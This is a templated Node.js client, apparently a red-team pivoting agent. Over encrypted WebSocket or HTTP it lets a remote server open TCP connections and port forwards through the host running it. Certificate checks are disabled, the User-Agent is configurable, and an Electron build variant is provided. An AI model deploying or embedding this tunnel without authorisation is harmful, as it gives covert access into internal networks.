const crypto = require('crypto');
const assert = require('assert');
const net = require('net');
{% if not electron %}
const http = require('http');
const https = require('https');

let wsImported = false;
try {
  var WebSocket = require('ws');
  wsImported = true;
} catch {
  console.warn('[!] Failed to import "ws" module — WebSocket support disabled.');
}
{% endif %}
/* AES */

function encrypt(key, plaintext) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
  const enc = Buffer.concat([cipher.update(plaintext), cipher.final()]);
  return Buffer.concat([iv, enc]);
}

function decrypt(key, ciphertext) {
  const iv = ciphertext.subarray(0, 16);
  const data = ciphertext.subarray(16);
  const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
  return Buffer.concat([decipher.update(data), decipher.final()]);
}

// Raised when an encrypted payload cannot be decrypted — almost always a wrong
// encryption key. Treated as fatal: the messenger can never decrypt server
// traffic, so main() logs once and stops instead of reconnecting in a loop.
class DecryptionError extends Error {
  constructor(message) {
    super(message);
    this.name = 'DecryptionError';
  }
}

function decryptOrThrow(key, payload) {
  try {
    return decrypt(key, payload);
  } catch (e) {
    if (e instanceof DecryptionError) throw e;
    throw new DecryptionError(e && e.message ? e.message : String(e));
  }
}

/* Message Structures */

const MSG = {
  INIT_TCP_REQ: 0x01,
  INIT_TCP_REP: 0x02,
  SEND_DATA:    0x03,
  CHECK_IN:     0x04,
  BIND_REQ:     0x05,
  BIND_REP:     0x06,
  CHECK_OUT:    0x07,
};

const CheckInMessage = (messenger_id) => ({ kind: 'CheckInMessage', messenger_id });
const InitiateTCPClientReq = (client_id, destination_host, destination_port, listening_host = '', listening_port = 0) => ({ kind: 'InitiateTCPClientReq', client_id, destination_host, destination_port, listening_host, listening_port });
const InitiateTCPClientRep = (client_id, bind_address, bind_port, address_type, reason, remote_addr, remote_port) => ({ kind: 'InitiateTCPClientRep', client_id, bind_address, bind_port, address_type, reason, remote_addr, remote_port });
const SendDataMessage = (client_id, data) => ({ kind: 'SendDataMessage', client_id, data });
const InitiateBINDReq = (bind_id, listening_host, listening_port, destination_host, destination_port) => ({ kind: 'InitiateBINDReq', bind_id, listening_host, listening_port, destination_host, destination_port });
const InitiateBINDRep = (bind_id, listening_host, listening_port, reason) => ({ kind: 'InitiateBINDRep', bind_id, listening_host, listening_port, reason });
const CheckOutMessage = () => ({ kind: 'CheckOutMessage' });

class MessageParser {
  static readUint32(data) {
    if (data.length < 4) throw new Error('Not enough bytes to read uint32');
    const value = data.readUInt32BE(0);
    const remaining = data.subarray(4);
    return [value, remaining];
  }

  static readString(data) {
    const [length, rest] = MessageParser.readUint32(data);
    if (rest.length < length) throw new Error('Not enough bytes for string');
    const str = rest.subarray(0, length).toString('utf8');
    const remaining = rest.subarray(length);
    return [str, remaining];
  }

  static parseCheckIn(value) {
    const [messenger_id] = MessageParser.readString(value);
    return CheckInMessage(messenger_id);
  }

  static parseInitiateTCPClientReq(value) {
    let v = value;
    let client_id, destination_host, destination_port;
    [client_id, v] = MessageParser.readString(v);
    [destination_host, v] = MessageParser.readString(v);
    [destination_port, v] = MessageParser.readUint32(v);
    // Optional listening endpoint appended by a remote port forwarder.
    let listening_host = '', listening_port = 0;
    if (v.length > 0) {
      [listening_host, v] = MessageParser.readString(v);
      [listening_port, v] = MessageParser.readUint32(v);
    }
    return InitiateTCPClientReq(client_id, destination_host, destination_port, listening_host, listening_port);
  }

  static parseInitiateTCPClientRep(value) {
    let v = value;
    let client_id, bind_address, bind_port, address_type, reason, remote_addr, remote_port;
    [client_id, v] = MessageParser.readString(v);
    [bind_address, v] = MessageParser.readString(v);
    [bind_port, v] = MessageParser.readUint32(v);
    [address_type, v] = MessageParser.readUint32(v);
    [reason, v] = MessageParser.readUint32(v);
    // remote_addr / remote_port are optional — the server omits them when it
    // has no remote info (e.g. a reason!=0 denial). Only read them if bytes
    // remain, otherwise a Rep without them overruns the buffer.
    remote_addr = '';
    remote_port = 0;
    if (v.length > 0) {
      [remote_addr, v] = MessageParser.readString(v);
      [remote_port, v] = MessageParser.readUint32(v);
    }
    return InitiateTCPClientRep(client_id, bind_address, bind_port, address_type, reason, remote_addr, remote_port);
  }

  static parseSendData(value) {
    let v = value;
    let client_id, encoded_data;
    [client_id, v] = MessageParser.readString(v);
    [encoded_data, v] = MessageParser.readString(v);
    const raw = Buffer.from(encoded_data, 'base64');
    return SendDataMessage(client_id, raw);
  }

  static parseInitiateBINDReq(value) {
    let v = value;
    let bind_id, listening_host, listening_port, destination_host, destination_port;
    [bind_id, v] = MessageParser.readString(v);
    [listening_host, v] = MessageParser.readString(v);
    [listening_port, v] = MessageParser.readUint32(v);
    [destination_host, v] = MessageParser.readString(v);
    [destination_port, v] = MessageParser.readUint32(v);
    return InitiateBINDReq(bind_id, listening_host, listening_port, destination_host, destination_port);
  }

  static parseInitiateBINDRep(value) {
    let v = value;
    let bind_id, listening_host, listening_port, reason;
    [bind_id, v] = MessageParser.readString(v);
    [listening_host, v] = MessageParser.readString(v);
    [listening_port, v] = MessageParser.readUint32(v);
    [reason, v] = MessageParser.readUint32(v);
    return InitiateBINDRep(bind_id, listening_host, listening_port, reason);
  }

  static deserializeMessage(encryptionKey, raw) {
    let data = raw;
    const [message_type, afterType] = MessageParser.readUint32(data);
    const [message_length, afterLen] = MessageParser.readUint32(afterType);
    const payload_len = message_length - 8;
    if (payload_len < 0) throw new Error('Invalid message length');
    if (afterLen.length < payload_len) throw new Error('Not enough bytes in data for the payload');
    const payload = afterLen.subarray(0, payload_len);
    const leftover = afterLen.subarray(payload_len);
    let parsed;
    switch (message_type) {
      case MSG.INIT_TCP_REQ: {
        const decrypted = decryptOrThrow(encryptionKey, payload);
        parsed = MessageParser.parseInitiateTCPClientReq(decrypted);
        break;
      }
      case MSG.INIT_TCP_REP: {
        const decrypted = decryptOrThrow(encryptionKey, payload);
        parsed = MessageParser.parseInitiateTCPClientRep(decrypted);
        break;
      }
      case MSG.SEND_DATA: {
        const decrypted = decryptOrThrow(encryptionKey, payload);
        parsed = MessageParser.parseSendData(decrypted);
        break;
      }
      case MSG.CHECK_IN: {
        parsed = MessageParser.parseCheckIn(payload);
        break;
      }
      case MSG.BIND_REQ: {
        const decrypted = decryptOrThrow(encryptionKey, payload);
        parsed = MessageParser.parseInitiateBINDReq(decrypted);
        break;
      }
      case MSG.BIND_REP: {
        const decrypted = decryptOrThrow(encryptionKey, payload);
        parsed = MessageParser.parseInitiateBINDRep(decrypted);
        break;
      }
      case MSG.CHECK_OUT: {
        parsed = CheckOutMessage();
        break;
      }
      default:
        throw new Error(`Unknown message type: 0x${message_type.toString(16)}`);
    }
    return { leftover, message: parsed };
  }
}

class MessageBuilder {
  static buildMessage(message_type, value) {
    const totalLen = 8 + value.length;
    const header = Buffer.allocUnsafe(8);
    header.writeUInt32BE(message_type >>> 0, 0);
    header.writeUInt32BE(totalLen >>> 0, 4);
    return Buffer.concat([header, value]);
  }

  static buildString(str) {
    const payload = Buffer.from(str, 'utf8');
    const out = Buffer.allocUnsafe(4 + payload.length);
    out.writeUInt32BE(payload.length >>> 0, 0);
    payload.copy(out, 4);
    return out;
  }

  static buildCheckInMessage(messenger_id) {
    return MessageBuilder.buildString(messenger_id);
  }

  static buildInitiateTCPClientReq(client_id, destination_host, destination_port, listening_host = '', listening_port = 0) {
    const p1 = MessageBuilder.buildString(client_id);
    const p2 = MessageBuilder.buildString(destination_host);
    const p3 = Buffer.allocUnsafe(4);
    p3.writeUInt32BE(destination_port >>> 0, 0);
    if (listening_host) {
      const p4 = MessageBuilder.buildString(listening_host);
      const p5 = Buffer.allocUnsafe(4);
      p5.writeUInt32BE(listening_port >>> 0, 0);
      return Buffer.concat([p1, p2, p3, p4, p5]);
    }
    return Buffer.concat([p1, p2, p3]);
  }

  static buildInitiateTCPClientRep(client_id, bind_address, bind_port, address_type, reason, remote_addr, remote_port) {
    const p1 = MessageBuilder.buildString(client_id);
    const p2 = MessageBuilder.buildString(bind_address);
    const p3 = Buffer.allocUnsafe(12);
    p3.writeUInt32BE(bind_port >>> 0, 0);
    p3.writeUInt32BE(address_type >>> 0, 4);
    p3.writeUInt32BE(reason >>> 0, 8);
    const p4 = MessageBuilder.buildString(remote_addr);
    const p5 = Buffer.allocUnsafe(4);
    p5.writeUInt32BE(remote_port >>> 0, 0);
    return Buffer.concat([p1, p2, p3, p4, p5]);
  }

  static buildSendData(client_id, data) {
    const p1 = MessageBuilder.buildString(client_id);
    const encoded = Buffer.from(data).toString('base64');
    const p2 = MessageBuilder.buildString(encoded);
    return Buffer.concat([p1, p2]);
  }

  static buildInitiateBINDReq(bind_id, listening_host, listening_port, destination_host, destination_port) {
    const p1 = MessageBuilder.buildString(bind_id);
    const p2 = MessageBuilder.buildString(listening_host);
    const p3 = Buffer.allocUnsafe(4);
    p3.writeUInt32BE(listening_port >>> 0, 0);
    const p4 = MessageBuilder.buildString(destination_host);
    const p5 = Buffer.allocUnsafe(4);
    p5.writeUInt32BE(destination_port >>> 0, 0);
    return Buffer.concat([p1, p2, p3, p4, p5]);
  }

  static buildInitiateBINDRep(bind_id, listening_host, listening_port, reason) {
    const p1 = MessageBuilder.buildString(bind_id);
    const p2 = MessageBuilder.buildString(listening_host);
    const p3 = Buffer.allocUnsafe(8);
    p3.writeUInt32BE(listening_port >>> 0, 0);
    p3.writeUInt32BE(reason >>> 0, 4);
    return Buffer.concat([p1, p2, p3]);
  }

  static serializeMessage(encryptionKey, msg) {
    let message_type;
    let value;
    switch (msg.kind) {
      case 'InitiateTCPClientReq': {
        message_type = MSG.INIT_TCP_REQ;
        const plain = MessageBuilder.buildInitiateTCPClientReq(msg.client_id, msg.destination_host, msg.destination_port, msg.listening_host, msg.listening_port);
        value = encrypt(encryptionKey, plain);
        break;
      }
      case 'InitiateTCPClientRep': {
        message_type = MSG.INIT_TCP_REP;
        const plain = MessageBuilder.buildInitiateTCPClientRep(msg.client_id, msg.bind_address, msg.bind_port, msg.address_type, msg.reason, msg.remote_addr, msg.remote_port);
        value = encrypt(encryptionKey, plain);
        break;
      }
      case 'SendDataMessage': {
        message_type = MSG.SEND_DATA;
        const plain = MessageBuilder.buildSendData(msg.client_id, msg.data);
        value = encrypt(encryptionKey, plain);
        break;
      }
      case 'CheckInMessage': {
        message_type = MSG.CHECK_IN;
        value = MessageBuilder.buildCheckInMessage(msg.messenger_id);
        break;
      }
      case 'InitiateBINDReq': {
        message_type = MSG.BIND_REQ;
        const plain = MessageBuilder.buildInitiateBINDReq(msg.bind_id, msg.listening_host, msg.listening_port, msg.destination_host, msg.destination_port);
        value = encrypt(encryptionKey, plain);
        break;
      }
      case 'InitiateBINDRep': {
        message_type = MSG.BIND_REP;
        const plain = MessageBuilder.buildInitiateBINDRep(msg.bind_id, msg.listening_host, msg.listening_port, msg.reason);
        value = encrypt(encryptionKey, plain);
        break;
      }
      default:
        throw new Error(`Unknown message tuple type: ${msg && msg.kind}`);
    }
    return MessageBuilder.buildMessage(message_type, value);
  }
}

/* CLIENT */

class Client {
  constructor(encryptionKey, userAgent) {
    this.encryptionKey = encryptionKey;
    this.headers = { 'User-Agent': userAgent };
    this.identifier = '';
    this.tcpClients = new Map();
    this.remotePortForwarders = [];
    this.upstream_messages = [];
    this.killed = false;
  }

  deserializeMessages(data) {
    const messages = [];
    while (true) {
      if (data.length < 8) break;
      const potentialLength = data.readUInt32BE(4);
      if (data.length < potentialLength) break;
      const { leftover, message } = MessageParser.deserializeMessage(this.encryptionKey, data);
      messages.push(message);
      data = leftover;
    }
    return messages;
  }

  serializeMessages(messages) {
    let data = Buffer.alloc(0);
    for (const message of messages) {
      const serialized = MessageBuilder.serializeMessage(this.encryptionKey, message);
      data = Buffer.concat([data, serialized]);
    }
    return data;
  }

  async handleBind(message) {
    // Empty listening host = STOP: tear down the forwarder immediately.
    // The server 'close' event fires _reportGone which sends the empty-host
    // BindRep to the server.
    if (message.listening_host === '') {
      const idx = this.remotePortForwarders.findIndex(f => f.identifier === message.bind_id);
      if (idx !== -1) {
        const existing = this.remotePortForwarders.splice(idx, 1)[0];
        existing.stop();
        existing.closeAllClients();
      }
      return;
    }

    // Real listening host = bind request. Idempotent if we already hold it.
    if (this.remotePortForwarders.some(f => f.identifier === message.bind_id)) {
      await this.sendUpstreamMessage(InitiateBINDRep(message.bind_id, message.listening_host, message.listening_port, 0));
      return;
    }

    try {
      const forwarder = new RemotePortForwarder(this, message.bind_id, message.listening_host, message.listening_port, message.destination_host, message.destination_port);
      const success = await forwarder.start();
      if (!success) {
        // Bind failed → report GONE (empty host).
        await this.sendUpstreamMessage(InitiateBINDRep(message.bind_id, message.listening_host, message.listening_port, 1));
        return;
      }
      this.remotePortForwarders.push(forwarder);
      await this.sendUpstreamMessage(InitiateBINDRep(message.bind_id, message.listening_host, message.listening_port, 0));
    } catch (e) {
      await this.sendUpstreamMessage(InitiateBINDRep(message.bind_id, message.listening_host, message.listening_port, 1));
    }
  }

  async handleMessage(message) {
    if (message.kind === 'InitiateTCPClientReq') {
      await this.handleInitiateTCPClientReq(message.client_id, message.destination_host, message.destination_port);
    } else if (message.kind === 'InitiateTCPClientRep') {
      const socket = this.tcpClients.get(message.client_id);
      if (!socket) return;
      if (message.reason !== 0) {
        socket._serverClosed = true;
        try { socket.end(); } catch {}
        this.tcpClients.delete(message.client_id);
      } else {
        socket.resume();
      }
    } else if (message.kind === 'SendDataMessage') {
      const socket = this.tcpClients.get(message.client_id);
      if (!socket) return;

      if (!message.data || message.data.length === 0) {
        if (this.tcpClients.has(message.client_id)) {
          this.tcpClients.delete(message.client_id);
          socket._serverClosed = true;
          try { socket.end(); } catch {}
        }
        return;
      }

      const ok = socket.write(message.data);
      if (!ok) await new Promise(r => socket.once('drain', r));
    } else if (message.kind === 'InitiateBINDReq') {
      await this.handleBind(message);
    } else if (message.kind === 'CheckOutMessage') {
      console.log('[!] Kill signal received');
      this.killed = true;
      for (const forwarder of [...this.remotePortForwarders]) {
        forwarder.stop();
        forwarder.closeAllClients();
      }
      this.remotePortForwarders = [];
      for (const [id, socket] of this.tcpClients) {
        socket._serverClosed = true;
        try { socket.destroy(); } catch {}
      }
      this.tcpClients.clear();
    } else {
      console.log(`[!] Received unknown message type: ${message.kind}`);
    }
  }

  async handleInitiateTCPClientReq(client_id, host, port) {
    const socket = new net.Socket();

    const errorToReason = (err) => {
      if (!err || !err.code) return 1;
      switch (err.code) {
        case 'ENETUNREACH': return 3;
        case 'EHOSTUNREACH': case 'ENOTFOUND': return 4;
        case 'ECONNREFUSED': return 5;
        case 'ETIMEDOUT': return 6;
        case 'EPROTONOSUPPORT': return 7;
        case 'EAFNOSUPPORT': return 8;
        default: return 1;
      }
    };

    const onError = async (err) => {
      await this.sendUpstreamMessage(
        InitiateTCPClientRep(client_id, '0.0.0.0', 0, 1, errorToReason(err), '0.0.0.0', 0)
      );
    };

    socket.once('connect', async () => {
      socket.setTimeout(0);
      socket.removeListener('error', onError);
      socket.on('error', () => {});
      this.tcpClients.set(client_id, socket);
      const bind_address = socket.localAddress;
      const bind_port = socket.localPort;
      const remote_addr = socket.remoteAddress;
      const remote_port = socket.remotePort;
      const address_type = net.isIPv4(bind_address) ? 1 : 4;

      await this.sendUpstreamMessage(
        InitiateTCPClientRep(client_id, bind_address, bind_port, address_type, 0, remote_addr, remote_port)
      );
    });

    socket.once('error', onError);

    socket.setTimeout(5000, () => {
      const err = new Error('Connection timed out');
      err.code = 'ETIMEDOUT';
      socket.destroy(err);
    });

    socket.on('data', async (chunk) => {
      await this.sendUpstreamMessage(SendDataMessage(client_id, chunk));
    });

    socket.once('close', async () => {
      if (!socket._serverClosed) {
        if (this.tcpClients.has(client_id)) {
          this.tcpClients.delete(client_id);
          if (!this.killed) {
            await this.sendUpstreamMessage(SendDataMessage(client_id, Buffer.alloc(0)));
          }
        }
      }
    });

    socket.connect(port, host);
  }

  async connect() {
    throw new Error('connect() not implemented by subclass');
  }

  async start() {
    throw new Error('start() not implemented by subclass');
  }

  sendUpstreamMessage(_message) {
    throw new Error('sendUpstreamMessage(message) not implemented by subclass');
  }

  async readvertiseForwarders() {
    // On every (re)connect, tell the server which RPFs we're actually listening
    // on (a real-host BindRep each). A server that lost its state re-learns them
    // as orphans; one that knows them just re-confirms.
    for (const fwd of [...this.remotePortForwarders]) {
      await this.sendUpstreamMessage(
        InitiateBINDRep(fwd.identifier, fwd.listening_host, fwd.listening_port, 0)
      );
    }
  }

}

class WSClient extends Client {

  constructor(serverUrl, encryptionKey, userAgent) {
    super(encryptionKey, userAgent);
    this.serverUrl = serverUrl.replace(/^\/+|\/+$/g, '');
    this.ws = null;
{% if not electron %}
    this.wsOptions = {
      headers: this.headers,
      rejectUnauthorized: false
    };
{% endif %}
  }

  async connect(){
    if (this.ws) {
      try { this.ws.close(); } catch {}
      this.ws = null;
    }
{% if not electron %}
    this.ws = new WebSocket(this.serverUrl, this.wsOptions);
{% else %}
    this.ws = new WebSocket(this.serverUrl);
{% endif %}
    this.ws.binaryType = 'arraybuffer';

    await new Promise((resolve, reject) => {
      this.ws.addEventListener('open', resolve, { once: true });
      this.ws.addEventListener('error',
        (e) => reject(e.error || new Error(e.message || 'Connection failed')),
        { once: true }
      );
    });

    const checkIn = this.serializeMessages([CheckInMessage(this.identifier)]);
    this.ws.send(checkIn);

    if (this.identifier) return;

    const msg = await new Promise((res, rej) => {
      this.ws.addEventListener('message',
        (e) => res(Buffer.from(e.data)),
        { once: true }
      );
      this.ws.addEventListener('error',
        (e) => rej(e.error || new Error(e.message || 'Connection failed')),
        { once: true }
      );
    });
    const messages = this.deserializeMessages(msg);
    assert(messages.length > 0, `[!] Invalid response from server ${messages}`);
    const checkInMessage = messages[0];
    assert.strictEqual(checkInMessage.kind, 'CheckInMessage', `[!] Invalid response from server: ${messages}`);
    this.identifier = checkInMessage.messenger_id;
  }

  async start() {
    await this.readvertiseForwarders();
    while (this.upstream_messages.length > 0 && this.ws.readyState === WebSocket.OPEN) {
      const msg = this.upstream_messages.shift();
      this.sendUpstreamMessage(msg);
    }

    return new Promise((resolve, reject) => {
      this.ws.addEventListener('message', (e) => {
        try {
          const buf = Buffer.from(e.data);
          const messages = this.deserializeMessages(buf);
          if (messages.some(m => m.kind === 'CheckOutMessage')) {
            this.handleMessage(messages.find(m => m.kind === 'CheckOutMessage'));
            try { this.ws.close(); } catch {}
            return;
          }
          for (const msg of messages) {
            this.handleMessage(msg);
          }
        } catch (err) {
          if (err instanceof DecryptionError) {
            try { this.ws.close(); } catch {}
            reject(err);
            return;
          }
          console.error('[!] handler error:', err.message);
        }
      });

      this.ws.addEventListener('close', (e) => {
        console.log(`[*] Websocket Closed: code=${e.code}, reason=${e.reason || ''}`);
        resolve({ code: e.code, reason: e.reason });
      }, { once: true });

      this.ws.addEventListener('error', (e) => {
        reject(e.error || new Error(e.message || 'WebSocket error'));
      }, { once: true });
    });
  }

  sendUpstreamMessage(upstream_message) {
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
      this.upstream_messages.push(upstream_message);
      return;
    }
    const upstream_messages = [CheckInMessage(this.identifier), upstream_message];
    const payload = this.serializeMessages(upstream_messages);
    this.ws.send(payload);
  }
}

class HTTPClient extends Client {
  constructor(serverUrl, encryptionKey, userAgent) {
    super(encryptionKey, userAgent);
    this.serverUrl = String(serverUrl).replace(/\/+$/g, '');
    this.identifier = '';
    this.upstream_messages = [];
    this._pending = [];
    this._timeoutMs = 10000;
{% if not electron %}
    const isHttps = this.serverUrl.startsWith('https');
    this._agent = isHttps
      ? new https.Agent({ rejectUnauthorized: false })
      : new http.Agent();
{% endif %}
  }

  async _postBinary(url, bodyBytes, timeoutMs = this._timeoutMs) {
{% if electron %}
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), timeoutMs);
    try {
      const resp = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/octet-stream',
          'Accept': 'application/octet-stream',
        },
        body: bodyBytes,
        signal: controller.signal,
      });
      clearTimeout(timer);
      if (!resp.ok) throw new Error(`HTTP ${resp.status} ${resp.statusText}`);
      return Buffer.from(await resp.arrayBuffer());
    } catch (e) {
      clearTimeout(timer);
      if (e.name === 'AbortError') throw new Error('Request timed out');
      throw e;
    }
{% else %}
    const u = new URL(url);
    const isHttps = u.protocol === 'https:';

    const options = {
      method: 'POST',
      hostname: u.hostname,
      port: u.port || (isHttps ? 443 : 80),
      path: u.pathname + u.search,
      headers: {
        'Content-Type': 'application/octet-stream',
        'Accept': 'application/octet-stream',
        'User-Agent': this.headers['User-Agent'],
        'Content-Length': Buffer.byteLength(bodyBytes),
      },
      agent: this._agent,
    };

    return new Promise((resolve, reject) => {
      const req = (isHttps ? https : http).request(options, (res) => {
        if (res.statusCode < 200 || res.statusCode >= 300) {
          res.resume();
          return reject(new Error(`HTTP ${res.statusCode} ${res.statusMessage}`));
        }
        const chunks = [];
        res.on('data', (d) => chunks.push(d));
        res.on('end', () => resolve(Buffer.concat(chunks)));
      });

      req.setTimeout(timeoutMs, () => req.destroy(new Error('Request timed out')));
      req.on('error', reject);
      req.end(bodyBytes);
    });
{% endif %}
  }

  async connect() {
    const payload = this.serializeMessages([CheckInMessage(this.identifier)]);

    let resp;
    try {
      resp = await this._postBinary(this.serverUrl, payload, 10000);
    } catch (e) {
      throw new Error(`Connect POST failed: ${e.message}`);
    }

    if (this.identifier) {
      return;
    }

    try {
      const messages = this.deserializeMessages(resp);
      if (!messages.length) throw new Error('Empty response');
      const msg0 = messages[0];
      if (msg0.kind !== 'CheckInMessage') {
        throw new Error(`Expected CheckInMessage, got ${msg0.kind}`);
      }
      this.identifier = msg0.messenger_id;
    } catch (e) {
      throw new Error(`Failed to parse connect response: ${e.message}`);
    }
  }

  async start() {
    await this.readvertiseForwarders();
    while (!this.killed) {
      if (this._pending.length === 0) {
        for (let i = 0; i < 5 && this.upstream_messages.length > 0; i++) {
          this._pending.push(this.upstream_messages.shift());
        }
      }

      const toSend = [CheckInMessage(this.identifier), ...this._pending];
      const payload = this.serializeMessages(toSend);

      let resp;
      try {
        resp = await this._postBinary(this.serverUrl, payload, 15000);
      } catch (e) {
        throw new Error(`HTTP poll failed: ${e.message}`);
      }

      this._pending.length = 0;

      if (resp && resp.length > 0) {
        try {
          const messages = this.deserializeMessages(resp);
          if (messages.some(m => m.kind === 'CheckOutMessage')) {
            this.handleMessage(messages.find(m => m.kind === 'CheckOutMessage'));
            break;
          }
          for (const m of messages) {
            this.handleMessage(m);
          }
        } catch (e) {
          if (e instanceof DecryptionError) throw e;
          throw new Error(`Failed to deserialize server response: ${e.message}`);
        }
      }

      await new Promise(r => setTimeout(r, 100));
    }
  }

  async sendUpstreamMessage(upstream_message) {
    this.upstream_messages.push(upstream_message);
  }
}

/* REMOTE PORT FORWARDER */

class RemotePortForwarder {
  constructor(messenger, bindId, listeningHost, listeningPort, destinationHost, destinationPort) {
    this.messenger = messenger;
    this.identifier = bindId;
    this.listening_host = listeningHost;
    this.listening_port = Number(listeningPort);
    this.destination_host = destinationHost;
    this.destination_port = Number(destinationPort);
    this.server = null;
    this.clientIds = [];
    this._gone = false;      // guards against a double "gone" report
  }

  async _reportGone() {
    // Tell the server this RPF is GONE (empty-host BindRep).
    // Guarded so it fires at most once even if both 'error' and 'close' race.
    if (this._gone) return;
    this._gone = true;
    const i = this.messenger.remotePortForwarders.indexOf(this);
    if (i !== -1) this.messenger.remotePortForwarders.splice(i, 1);
    this.closeAllClients();
    try {
      await this.messenger.sendUpstreamMessage(InitiateBINDRep(this.identifier, this.listening_host, this.listening_port, 1));
    } catch {}
  }

  async start() {
    return new Promise((resolve, reject) => {
      this.server = net.createServer((socket) => {
        const client_id = this.randomAlphaNum(10);
        this.clientIds.push(client_id);

        this.messenger.tcpClients.set(client_id, socket);

        socket.pause();

        this.messenger.sendUpstreamMessage(
          InitiateTCPClientReq(
            client_id,
            this.destination_host,
            this.destination_port,
            this.listening_host,
            this.listening_port
          )
        );

        socket.on('data', async (chunk) => {
          await this.messenger.sendUpstreamMessage(
            SendDataMessage(client_id, chunk)
          );
        });

        socket.once('close', async () => {
          if (!socket._serverClosed) {
            if (this.messenger.tcpClients.has(client_id)) {
              this.messenger.tcpClients.delete(client_id);
              if (!this.messenger.killed) {
                await this.messenger.sendUpstreamMessage(
                  SendDataMessage(client_id, Buffer.alloc(0))
                );
              }
            }
          }
        });

        socket.on('error', () => {});
      });

      this.server.once('listening', () => {
        const addr = this.server.address();
        console.log(
          `[+] Remote Port Forwarder listening on ${addr.address}:${addr.port}`
        );
        // When the server closes (intentional or crash), report it gone.
        this.server.on('error', () => this._reportGone());
        this.server.on('close', () => this._reportGone());
        resolve(true);
      });

      this.server.once('error', (e) => {
        console.error(
          `[!] ${this.listening_host}:${this.listening_port} is already in use or failed:`,
          e.message
        );
        resolve(false);
      });

      this.server.listen(this.listening_port, this.listening_host);
    });
  }

  stop() {
    if (this.server) {
      try { this.server.close(); } catch {}
    }
  }

  closeAllClients() {
    for (const clientId of this.clientIds) {
      const socket = this.messenger.tcpClients.get(clientId);
      if (socket) {
        this.messenger.tcpClients.delete(clientId);
        socket._serverClosed = true;
        try { socket.destroy(); } catch {}
      }
    }
  }

  randomAlphaNum(len = 10) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < len; i++) {
      const idx = Math.floor(Math.random() * chars.length);
      result += chars[idx];
    }
    return result;
  }
}

/* ARG PARSING */

function sha256Bytes(s) {
  return crypto.createHash('sha256').update(String(s), 'utf8').digest();
}

function parseArgs(argv) {
  const args = {
    server: null,
    encryptionKey: null,
    userAgent: null,
    retryAttempts: null,
    retryDuration: null,
  };
  for (let i = 2; i < argv.length; i++) {
    const a = argv[i];
    if (a === '--server-url') args.serverUrl = argv[++i];
    else if (a === '--encryption-key') args.encryptionKey = argv[++i];
    else if (a === '--user-agent') args.userAgent = argv[++i];
    else if (a === '--proxy') args.proxy = argv[++i];
    else if (a === '--retry-attempts') args.retryAttempts = parseInt(argv[++i], 10);
    else if (a === '--retry-duration') args.retryDuration = parseFloat(argv[++i]);
    else {
      console.log(`[!] Could not find argument \`${a}\`.`)
    }
  }
  return args;
}

function sleep(ms) {
  return new Promise(res => setTimeout(res, ms));
}

async function main() {
  const args = parseArgs(process.argv);

  const serverUrl = args.serverUrl || DEFAULTS.SERVER;
  let encryptionKey = args.encryptionKey || DEFAULTS.ENCRYPTION_KEY;
  if (!encryptionKey) {
    console.error('[!] No encryption key provided, please specify `--encryption-key`');
    return;
  }
  encryptionKey = sha256Bytes(encryptionKey);
  const userAgent = args.userAgent || DEFAULTS.USER_AGENT;
  const proxy = args.proxy || DEFAULTS.PROXY;
  if (proxy) {
    console.log('[!] No native support for proxies.');
  }

  const retryDuration = Number.isFinite(args.retryDuration)
    ? args.retryDuration
    : Number(DEFAULTS.RETRY_DURATION);

  const retryAttempts = Number.isInteger(args.retryAttempts)
    ? args.retryAttempts
    : Number(DEFAULTS.RETRY_ATTEMPTS);

  let remainder = serverUrl;
  let attempts;
  if (serverUrl.includes('://')) {
    const parts = serverUrl.split('://', 2);
    const scheme = parts[0];
    remainder = parts[1];
    attempts = scheme.split('+');
  } else {
    attempts = ['ws', 'wss', 'http', 'https'];
  }

  let client = null;
  for (const attempt of attempts) {
    const candidateUrl = `${attempt}://${remainder}/`;
    try {
{% if not electron %}
      if (attempt.includes('ws') && wsImported) {
{% else %}
      if (attempt.includes('ws')) {
{% endif %}
        console.log(`[*] Attempting to connect over ${attempt.toUpperCase()}`);
        client = new WSClient(candidateUrl, encryptionKey, userAgent);
      } else if (attempt.includes('http')) {
        console.log(`[*] Attempting to connect over ${attempt.toUpperCase()}`);
        client = new HTTPClient(candidateUrl, encryptionKey, userAgent);
      } else {
        console.log(`[!] Unsupported scheme ${attempt.toUpperCase()}`);
        continue;
      }

      await client.connect();
      console.log(`[+] Connected to ${candidateUrl}`);
      break;
    } catch (e) {
      if (e instanceof DecryptionError) {
        console.error('[!] Decryption failed — the encryption key is likely incorrect. The messenger cannot decrypt server traffic and is stopping.');
        return;
      }
      console.error(`[!] Connection failed: ${e?.message || e}`);
      client = null;
    }
  }

  if (!client) {
    console.log('[!] All connection attempts failed.');
    return;
  }

  try {
    await client.start();
  } catch (e) {
    if (e instanceof DecryptionError) {
      console.error('[!] Decryption failed — the encryption key is likely incorrect. The messenger cannot decrypt server traffic and is stopping.');
      return;
    }
    console.error(`[!] Disconnected: ${e?.message || e}`);
  }

  if (client.killed) return;

  if (!(retryAttempts > 0)) {
    console.log('[*] Retry attempts set to zero, exiting.');
    return;
  }

  const sleepTime = retryDuration / retryAttempts;
  let consecutiveFailures = 0;

  while (consecutiveFailures < retryAttempts) {
    consecutiveFailures++;
    console.log(`[*] Attempting to reconnect (attempt ${consecutiveFailures}/${retryAttempts})`);
    await sleep(sleepTime * 1000);
    try {
      await client.connect();
      console.log(`[+] Reconnected`);
      consecutiveFailures = 0;
      await client.start();
    } catch (e) {
      if (e instanceof DecryptionError) {
        console.error('[!] Decryption failed — the encryption key is likely incorrect. The messenger cannot decrypt server traffic and is stopping.');
        return;
      }
      console.error(`[!] Reconnection failed: ${e?.message || e}`);
    }
    if (client.killed) break;
  }
}

const DEFAULTS = {
  SERVER: '{{ server_url }}',
  ENCRYPTION_KEY: '{{ encryption_key }}',
  USER_AGENT: '{{ user_agent }}',
  PROXY: '{{ proxy }}',
  RETRY_ATTEMPTS: {{ retry_attempts }},
  RETRY_DURATION: {{ retry_duration }},
};

{% if not electron %}
if (require.main === module) {
  main().catch(console.error);
}
{% else %}
main().catch(console.error);
{% endif %}
